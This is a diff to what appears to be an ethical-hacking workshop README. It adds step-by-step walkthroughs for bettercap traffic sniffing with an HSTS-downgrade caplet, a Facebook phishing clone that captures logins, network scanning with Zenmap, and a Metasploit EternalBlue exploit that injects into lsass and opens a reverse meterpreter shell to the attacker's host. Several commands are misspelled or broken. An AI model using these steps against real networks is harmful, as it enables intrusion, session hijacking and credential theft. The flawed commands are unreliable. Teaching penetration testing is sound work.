@@ -50,11 +50,24 @@ Default username: root and pass: toor
 11.	To capture the victim’s data aka “sniffing”
 ```net.sniff on```
 
-12.	Now we use WireShark  which is a tool that captures the victim’s information and decodes into a file that is easy to read by the user so to Run the program, all you need to do is type “wireshark”
-13.	Now to release the attack on the  wanted interface 
-```select eth0```
+12.	Now we use WireShark  which is a tool that captures the victim’s information and decodes into a file that is easy to read by the user so to Run the program, all you need to do is type “wireshark” on another new terminal.
+
+13.	Now to release the attack on the  wanted interface , select “etho” and observe the traffic, choose a site and stop the traffic then write “http” on the filter.
 
 14.	Now is Testing Time!!! So all you need to do is go to any “http” Website and not “https” and then you can enter some data and check the “POST” Packets to see how your data has been sniffed and sent to the hacker.
+
+15.	So now after learning how to use it on http. We will learn how to downgrade any website such as “https” and “hsts” to “http”. We begin by going to the below directory and deleting the file named “hstshihack”
+```/usr/share/bettercap/caplets```
+
+16.	Now we download the new file by cloning the github repository of the “hstshijack” tool.
+```git clone https://github.com/The-Assembly/Intro-to-Ethical-Hacking/blob/master/hstshijack/
+
+```
+
+17.	Then, we go to the downloads file and cut the file named “hstshijack” and paste it in place of the previous file following this path ```/usr/share/bettercap/caplets```
+
+18.	Lastly, to use the tool, we have to type           				   in the terminal and follow the above stepsstarting from no.3 to perform the attack.
+```hstshijack/hstshijack```
 
 ## BeEF
 
@@ -129,4 +142,64 @@ This  is a tool that is used to create a duplicate of a popular site like Facebo
 8.	Now if you copy the ip address “0.0.0.0:5000/Neptune” You’ll be redirected to the cloned page which in this case is facebook. This is a fake page based on facebook design and everything that you enter gets copied and sent to the hacker. So to test it, just enter any garbage text and submit.
 
 9.	You can check your entries or responses got from the fake site we cloned by going down on the original page and clicking “View” to see whatever username and pass were entered.
+
+Zenmap
+
+Zenmap is the Nmap security scanner graphical user interface and provides for hundreds of options. It lets users do things like save scans and compare them, view network topology maps, view displays of ports running on a host or all hosts on a network, and store scans in a searchable database
+
+
+1.	Click on the Zenmap icon from the left panel on linux desktop
+2.	Go to the terminal to get the gateway ```gateway route -n```
+
+3.	Then we go to the target tab and enter the gateway found with /24
+4.	Then we choose “Quick Scan plus” as a profile 
+5.	After waiting for some time, we will be able to see all IP addresses that are connected on that gateway
+6.	We choose one as our target. In this case, we will choose one with Windows 7
+7.	Now we don’t know whether this network is vulnerable or not so for that we will be using a tool called “Metasploit” which will be discussed further in the next step.
+
+
+Metasploit
+
+The Metasploit Framework is an open source penetration testing and development platform that provides exploits for a variety of applications, operating systems and platforms. Metasploit is one of the most commonly used penetration testing tools and comes built-in to Kali Linux
+
+
+1.	We start by cloning the github repository of the Metasploit tool.
+
+```git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit```
+
+2.	Then we go to the root directory and choose the file with “.rb” extension. We copy it and then follow this path
+
+```/usr/share/Metasploit-framework/modules/exploits/windows/smb```
+
+3.	We paste the file copied before inside the smb folder.
+4.	Then, we go back to the terminal so that we can run the attack. We do that by first typing   ```msfconsole```                        
+5.	Now, to check whether the device is vulnerable or not we go to terminal and say 
+
+```use auxiliary/scanner/smb/smb_ms17_010```
+
+6.	Now we ```show options ``` to see the different things we could do with the tool.
+7.	Then, we would want to set the target IP which in this case will be our own device IP. This could be found by typing “ifconfig” on Linux or “ipconfig” on the device cmd and then we type this without the “<<>>”
+
+```set RHOSTS <<victim’s ip add>>```
+
+8.	Now we run the attack by simply typing “run”
+9.	Then you’ll see how it would tell you whether this network is vulnerable or not so since ours is we will do this 
+
+```use exploit/windows/smb/eternalblue_doublepulsar```
+
+10.	Now, we will try gaining access to the target again by 
+
+```set RHOSTS <<victim’s ip add>>```
+
+11.	Then to target a fast and basic process that runs on every device to inject the attack on
+```set PROCESSINJECT lssas.exe```
+
+```set PAYLOAD windows/x64/meterpeter/reverse_tcp```
+
+
+12.	Now, we set the Local host of which is the hacker’s ip address as it is used to access the network services running on his host.
+
+```set LHOST <<your ip address>>```
+
+13.	Last we run the attack by typing “run” followed by “help” and then we follow the presenter to see all different techniques that could be used with this tool.
 
